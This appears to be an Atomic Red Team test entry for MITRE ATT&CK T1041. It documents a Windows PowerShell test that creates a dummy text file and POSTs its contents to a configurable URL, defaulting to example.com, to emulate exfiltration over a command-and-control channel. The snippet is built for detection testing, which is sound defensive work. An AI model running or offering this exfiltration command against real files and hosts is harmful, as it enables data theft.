---
tags: [T1041, atomic_test]
filename: "[[T1041 - Exfiltration Over C2 Channel]]"
---
# T1041 - Exfiltration Over C2 Channel

## Atomic Test #1 - C2 Data Exfiltration
Exfiltrates a file present on the victim machine to the C2 server.

**Supported Platforms:** Windows


**auto_generated_guid:** d1253f6e-c29b-49dc-b466-2147a6191932





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| destination_url | Destination URL to post encoded data. | string | example.com|
| filepath | The file which is being exfiltrated to the C2 Server. | path | $env:TEMP&#92;LineNumbers.txt|


#### Attack Commands: Run with `powershell`! 


```powershell
if(-not (Test-Path #{filepath})){ 
  1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value "This is line $_." }
}
[System.Net.ServicePointManager]::Expect100Continue = $false
$filecontent = Get-Content -Path #{filepath}
Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive
```






<br/>
